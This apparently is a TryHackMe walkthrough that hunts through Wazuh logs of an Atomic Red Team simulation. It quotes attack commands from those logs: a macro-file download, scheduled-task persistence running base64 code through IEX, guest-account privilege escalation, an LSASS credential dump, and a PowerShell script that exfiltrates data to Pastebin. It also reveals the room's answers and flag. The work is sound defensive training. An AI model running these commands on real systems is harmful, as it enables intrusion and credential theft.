# Monday Monitor

## Scenario

Swiftspend Finance, the coolest fintech company in town, is on a mission to level up its cyber security game to keep those digital adversaries at bay and ensure their customers stay safe and sound.

Led by the tech-savvy Senior Security Engineer John Sterling, Swiftspend's latest project is about beefing up their endpoint monitoring using Wazuh and Sysmon. They've been running some tests to see how well their cyber guardians can sniff out trouble. And guess what? You're the cyber sleuth they've called in to crack the code!

The tests were run on Apr 29, 2024, between 12:00:00 and 20:00:00. As you dive into the logs, you'll look for any suspicious process shenanigans or weird network connections, you name it! Your mission? Unravel the mysteries within the logs and dish out some epic insights to fine-tune Swiftspend's defences.

Once logged in, navigate to the **Security Events** module and use the saved query `Monday_Monitor` to access the logs.

### Questions

Heads up, I did **not** censor the answers in this walkthrough.

#### Question 1

1. Initial access was established using a downloaded file. What is the file name saved on the host?

After navigating to **Wazuh -> Modules -> Security Events** go to the top left under dashboard, click the floppy disk icon, and select `Monday_Monitor`

![saved_queries](https://github.com/user-attachments/assets/93cbdfbd-35e0-4621-9304-7d2da4b71d6a)

Near the top right side, select the Date area, and then select **Absolute**. We need to select this time period:

**Apr 29, 2024, between 12:00:000 and 20:00:000**

Make sure to press update after. Your dashboard should look like this now.

![time_period](https://github.com/user-attachments/assets/e15a8069-0529-4deb-b0d6-881a981cfbe4)

Now we know a suspicious file was downloaded, the question is how do we sort through the events to find it. Let's try sorting by HTTP. In the dashboard query search type "HTTP".

![http](https://github.com/user-attachments/assets/84553b4a-a11e-4996-8038-d99ee8ae5f09)

We find three events, let's examine them. I'm going to start with the earliest event chronologically. 

![first_alert](https://github.com/user-attachments/assets/7afb4e10-17c3-49e4-977f-99e64ffeae88)

We see the command `\"powershell.exe\" & {$url = 'http://localhost/SwiftSpend_Financial_Expenses.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm}` has been issued on the agent.

Let's break down what this command is doing:

* `powershell.exe` is invoked

* `& {...}` executes a script block

* `$url` defines a URL where the file is hosted, in this case `http://localhost/SwiftSpend_Financial_Expenses.xlsm` 

* `Invoke-WebRequest` downloads the file

* `OutFile` saves the file to the system's directory as `PhishingAttachment.xlsm` 

Red Flags:

* Running `powershell` (LOLBIN)

* `.xlsm` files can contain malicious VBA macros 

* `$env:TEMP` is a common staging location

* Saving the file with name `PhishingAttackment.xlsm` is an obvious indicator for demonstration purposes

We then see the same command ran again five minutes later. Another five minutes later we see a simmilar command with one notable change `\"powershell.exe\" & {$url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\SwiftSpend_Financial_Expenses.xlsm}`

Notable Change:

* The file is again being saved, but instead renamed to `SwiftSpend_Financial_Expenses.xlsm` in order for it to masquerade as a legitimate document

We have found the answer to the first question.

`SwiftSpend_Financial_Expenses.xlsm`

#### Question 2

2. What is the full command run to create a scheduled task?

We can start by searching for `schtasks.exe` which is a native windows tool used to perform tasks at a specified time/interval. You should see four alerts.

![schtasks](https://github.com/user-attachments/assets/63bba209-bdcc-492a-b6ca-33a3468f5858)

If we look at the earliest alert we can find the command we're looking for. 

![schtasks_command](https://github.com/user-attachments/assets/d1b14f0c-ba44-4e72-81e8-257cd85a77e2)

`\"cmd.exe\" /c \"reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f & schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 12:34\"`

Let's break this command down:

* `cmd.exe /c` tells CMD to execute the following command string, then terminate

* `reg add` is the command to add a registry key or value

* `HKCU\SOFTWARE\ATOMIC-T1053.005` oath to the registry key in the current user hive 

* `/v test` The name of the value being created 

* `/t REG_SZ` Type = string 

* `/d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0=` base64 encoded for `ping www.youarevulnerable.thm`

* `/f` Force overwrite if the value already exists 

* `&` Executes the next command after the registry value is created 

* `schtasks.exe` Windows built in utility to manage scheduled tasks

* `/Create` Creating a new task

* `/F` Force overwrite if a task with this name exists

* `/TN "ATOMIC-T1053.005"` Task name is `ATOMIC-T1053.005`

* `cmd /c` Again, run and exit

* `start /min ""` Start a new minimized window, with an empty string as the name

* `powershell.exe -Command` Run PowerShell with the following command

* `Get-ItemProperty ... .test` Reads the test value from the registry 

* `FromBase64String(...)` Decodes the value (base64 -> ASCII)

* `IEX(...)` Invoke-Expression, executes the decoded command as PowerShell code

* `/sc daily` Run daily 

* `/st 12:34` Start time is 12:34 PM

Wow that was a lot! But now we can see that this command is definetly malicious. It adds a base64 encoded payload to the registry, and creates a scheduled task to run the decoded payload daily in a minimized window. The decoded payload pings "www[.]youarevulnerable[.]thm" at 12:34 PM.

The answer to question number two is: 

`"cmd.exe" /c "reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f & schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st 12:34"`

I got a little carried away, we've actually found the answer to the next two questions as well.

#### Question 3

3. What time is the scheduled task meant to run?
   
   `12:34`

#### Question 4

4. What was encoded?
   
   `ping www.youarevulnerable.thm`

#### Question 5

What password was set for the new user account?

First we search which Windows Event ID is associated with a password change, and we find that `4738` indicates a user account was changed. This event is logged when any modification occurs to a user account, such as changes in user rights, group memberships, or password updates.

By searching for `data.win.system.eventID:4738` we can filter for alerts with this event ID.

![event_ID](https://github.com/user-attachments/assets/a284fa1f-7be5-42a8-a4ea-16b6166026af)

The alerts themselves don't tell us what we're looking for (the password), but by looking for events around the same time that these two events occurred, we might be able to find some more information. I chose to sort by:

**Apr 29, 2024 @ 14:14:00:000 -> Apr 29, 2024 @ 14:15:00:000**

To make these easier, click **Events** and then on the left side under **Available fields** look for `data.win.eventdata.commandLine` and press the plus sign to add it to **Selected fields**.

![fields](https://github.com/user-attachments/assets/d83eeb4a-ed4a-4a3a-8af0-1db860326424)

We see a few suspicious things here. First we see the command `\"C:\\Windows\\system32\\net.exe\" user guest /active:yes` being run which invokes net.exe (LOLBIN) to enable the guest account. 

Then we see a similar command `C:\\Windows\\system32\\net1 user guest /active:yes` which does the same thing except using net1 which is a fallback binary. Threat actors can use this to potentially avoid monitoring rules that only look for net.exe.

Following the enablement of the guest account, we find what we're looking for. The command `\"C:\\Windows\\system32\\net.exe\" user guest I_AM_M0NIT0R1NG` attempts to change the password of the guest account to `I_AM_M0NIT0R1NG` and then is followed by again trying with net1 instead of net.exe.

We've found our answer but as a bonus, we can see the following command `\"C:\\Windows\\system32\\net.exe\" localgroup Administrators guest /add` adds the guest account to the Administrators group, giving it full administrative privileges.

The answer is:

`I_AM_M0NIT0R1NG`

#### Question 6

What is the name of the .exe that was used to dump credentials?

Let's follow this attack chain further by increasing our time scope to:

**Apr 29, 2024 @ 14:14:00:000 -> Apr 29, 2024 @ 14:20:00:000**

![memotech](https://github.com/user-attachments/assets/7d8f223b-2036-4bfd-90c3-409d1bde5912)

We see typical discovery commands being run like `HOSTNAME.exe` and `whoami.exe` plus the use of `\"C:\\Windows\\system32\\rundll32.exe\" keymgr,KRShowKeyMgr` which lets you view stored credentials.

Then we see the command `\"cmd.exe\" /c \"C:\\Tools\\AtomicRedTeam\\atomics\\T1003.001\\bin\\x64\\memotech.exe \"sekurlsa::minidump %%tmp%%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit\"` which is of particular interest. Let's break this one down further:

* `cmd.exe /c` Execute the following command and then exit

* `AtomicRedTeam` Open source library of individual security techniques used to simulate specific adversary techniques 

* `T1003.001` Atomic Red Team/MITRE ATT&CK technique related to LSASS Memory Dumping

* `C:\Tools\...memotech.exe` Suspicious tool being run, likely similar to Mimikatz

* `"sekurlsa::minidump %tmp%\lsass.DMP"` Loads a minidump of LSASS (Local Security Authority Subsystem Service) from %TEMP%. LSASS holds plaintext passwords, NTLM hashes, and Kerberos tickets in memory. 

* `"sekurlsa::logonpasswords full"` Extracts all available credentials from the minidump 

* `exit` Closes the tool/command shell

Answer:

`memotech.exe`

#### Question 7

Data was exfiltrated from the host. What was the flag that was part of the data?

I expanded my timeline to:

**Apr 29, 2024 @ 14:14:00:000 -> Apr 29, 2024 @ 15:00:00:000**

![exfil](https://github.com/user-attachments/assets/b180828f-6ef1-48a5-b99b-91414d763528)

We see various malicious commands, mostly discovery for folders or documents that might have data worth exfiltrating. We then see the use of `notepad.exe` with relation to opening Atomic Read Team YAML test definitions. These files provide:

* Test name and description

* Attack prerequisites 

* Test commands to run

* Cleanup procedures

* Metadata for mapping to MITRE ATT&CK

Following these staging commands, we find the exfilitration we're looking for:

`\"powershell.exe\" &amp; {$apiKey = \\\"\"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\\\"\" $content = \\\"\"secrets, api keys, passwords, THM{M0N1T0R_1$_1N_3FF3CT}, confidential, private, wall, redeem...\\\"\" $url = \\\"\"https://pastebin.com/api/api_post.php\\\"\" $postData = @{   api_dev_key   = $apiKey   api_option    = \\\"\"paste\\\"\"   api_paste_code = $content } $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData Write-Host \\\"\"Your paste URL: $response\\\"\"}`

Breaking this command down:

* `powershell.exe & {...}` Launches a new PowerShell session, runs the script block that follows the `&`

* `$apiKey = "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0"` Stores a Pastebin API developer key

* `$content = "secrets, api keys, passwords, THM{M0N1T0R_1$_1N_3FF3CT}, confidential, private, wall, redeem..."` Sets up the data payload to be exfiltrated 

* ``$url = "https://pastebin.com/api/api_post.php"`` Stores the Pastebin API endpoint URL for submitting data

* `$postData = @{ ... }` Creates a hashtable containing POST request parameters

* `$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData` Sends the HTTP POST request using the PowerShell Invoke-RestMethod

* `Write-Host "Your paste URL: $response"` Outputs the resulting Pastebin link to the console 

As we can see the command is clearly attempting to exfiltrate the data using Pastebin. 

Final Answer:

`THM{M0N1T0R_1$_1N_3FF3CT}` 

## Final Notes

While this room was fairly basic, and in a real scenario this attack would be much less telegraphed, I still learned a lot. I had previously only used Splunk, and a bit of Elastic, so learning how to navigate Wazuh has further helped me understand how to search for specific alerts, and how to discover true positives/malicious activity. This room has been a great prelude to my attempt to implement Wazuh in my homelab, and has further shown me how to follow a basic attack chain. Thanks for reading!
